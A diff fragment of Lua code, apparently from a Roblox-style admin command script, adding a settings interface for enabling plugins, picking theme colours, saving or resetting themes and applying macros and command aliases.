+                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
+                        Utils.Notify(nil, "Plugin Enabled", format("plugin %s successfully enabled", PluginName));
+                    else
+                        DisabledPlugins[PluginName] = true
+                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
+                        Utils.Notify(nil, "Plugin Disabled", format("plugin %s successfully disabled", PluginName));
+                    end
+                end
+            end
+        end, map(Plugins, function(Key, Plugin)
+            return not PluginConf.DisabledPlugins[Plugin[2]().Name], Plugin[1]
+        end));
+    
+        PluginSettings.Toggle("Plugins Enabled", CurrentPluginConf.PluginsEnabled, function(Callback)
+            SetPluginConfig({PluginsEnabled = Callback});
+        end)
+
+        PluginSettings.Toggle("Plugins Debug", CurrentPluginConf.PluginDebug, function(Callback)
+            SetPluginConfig({PluginDebug = Callback});
+        end)
+
+        PluginSettings.Toggle("Safe Plugins", CurrentPluginConf.SafePlugins, function(Callback)
+            SetPluginConfig({SafePlugins = Callback});
+        end)
+
+        local Themes = ConfigUILib.NewPage("Themes");
+
+        local Color = Themes.NewSection("Colors");
+        local Options = Themes.NewSection("Options");
+
+        local RainbowEnabled = false
+        Color.ColorPicker("All Background", UITheme.Background.BackgroundColor, function(Callback, IsRainbow)
+            UITheme.Background.BackgroundColor = Callback
+            RainbowEnabled = IsRainbow
+        end)
+        Color.ColorPicker("CommandBar", UITheme.CommandBar.BackgroundColor, function(Callback)
+            if (not RainbowEnabled) then
+                UITheme.CommandBar.BackgroundColor = Callback
+            end
+        end)
+        Color.ColorPicker("Notification", UITheme.Notification.BackgroundColor, function(Callback)
+            if (not RainbowEnabled) then
+                UITheme.Notification.BackgroundColor = Callback
+            end
+        end)
+        Color.ColorPicker("ChatLogs", UITheme.ChatLogs.BackgroundColor, function(Callback)
+            if (not RainbowEnabled) then
+                UITheme.ChatLogs.BackgroundColor = Callback
+            end
+        end)
+        Color.ColorPicker("CommandList", UITheme.CommandList.BackgroundColor, function(Callback)
+            if (not RainbowEnabled) then
+                UITheme.CommandList.BackgroundColor = Callback
+            end
+        end)
+        Color.ColorPicker("Config", UITheme.Config.BackgroundColor, function(Callback)
+            if (not RainbowEnabled) then
+                UITheme.Config.BackgroundColor = Callback
+            end
+        end)
+
+        Color.ColorPicker("All Text", UITheme.Background.TextColor, function(Callback)
+            UITheme.Background.TextColor = Callback
+        end)
+
+        local ToggleSave;
+        ToggleSave = Options.Toggle("Save Theme", false, function(Callback)
+            WriteThemeConfig();
+            wait(.5);
+            ToggleSave();
+            Utils.Notify(nil, "Theme", "saved theme");
+        end)
+
+        local ToggleLoad;
+        ToggleLoad = Options.Toggle("Load Theme", false, function(Callback)
+            LoadTheme(GetThemeConfig());
+            wait(.5);
+            ToggleLoad();
+            Utils.Notify(nil, "Theme", "Loaded theme");
+        end)
+
+        local ToggleReset;
+        ToggleReset = Options.Toggle("Reset Theme", false, function(Callback)
+            UITheme.Background.BackgroundColor = "Reset"
+            UITheme.Notification.TextColor = "Reset"
+            UITheme.CommandBar.TextColor = "Reset"
+            UITheme.CommandList.TextColor = "Reset"
+            UITheme.ChatLogs.TextColor = "Reset"
+            UITheme.Config.TextColor = "Reset"
+            UITheme.Notification.Transparency = "Reset"
+            UITheme.CommandBar.Transparency = "Reset"
+            UITheme.CommandList.Transparency = "Reset"
+            UITheme.ChatLogs.Transparency = "Reset"
+            UITheme.Config.Transparency = "Reset"
+            wait(.5);
+            ToggleReset();
+            Utils.Notify(nil, "Theme", "reset theme");
+        end)
+
+    end
+
+    delay(1, function()
+        for i = 1, #Macros do
+            local Macro = Macros[i]
+            for i2 = 1, #Macro.Keys do
+                Macros[i].Keys[i2] = Enum.KeyCode[Macros[i].Keys[i2]]
+            end
+        end
+        if (CurrentConfig.WideBar) then
+            WideBar = true
+            Utils.Tween(CommandBar, "Quint", "Out", .5, {
+                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
+            })
+        end
+        KillCam = CurrentConfig.KillCam
+        local Aliases = CurrentConfig.Aliases
+        if (Aliases) then
+            for i, v in next, Aliases do
+                if (CommandsTable[i]) then
+                    for i2 = 1, #v do
+                        local Alias = v[i2]
+                        local Add = CommandsTable[i]
+                        Add.Name = Alias
+                        CommandsTable[Alias] = Add
+                    end
+                end
+            end
+        end
+    end)
+end
+--END IMPORT [config]
+
 
 AddConnection(CConnect(CommandBar.Input.FocusLost, function()
     local Text = trim(CommandBar.Input.Text);
